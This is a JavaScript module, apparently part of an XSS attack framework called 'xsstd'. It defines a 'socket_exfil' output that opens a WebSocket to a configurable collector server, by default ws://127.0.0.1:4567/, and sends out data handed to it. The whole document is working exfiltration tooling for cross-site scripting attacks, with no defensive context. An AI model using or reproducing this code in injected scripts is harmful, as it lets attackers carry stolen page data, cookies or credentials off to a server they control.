xsstd.socket_exfil = xsstd.output.extend({

	_socket:null,
	_server:'ws://127.0.0.1:4567/',

	constructor: function(){
		
	   	this._setParams(arguments[0]);
	   	this._socket = new WebSocket(this._server);

	},

	send: function(_data){

		console.log('here: ' + this._server);
		var _self = this;

		try{  

			this._socket.send(_data);
			//socket.onmessage = function(e) { alert("got: " + e.data); }

		} catch(ex){
			xsstd.log( "Socket IO failed: " + ex );
		}
		

	},

	_setParams: function(args){
			if (typeof args!='undefined'){
		   	if(typeof args.server=='string'){
		   		this._server = args.server;
		   	}
		}
	}

});
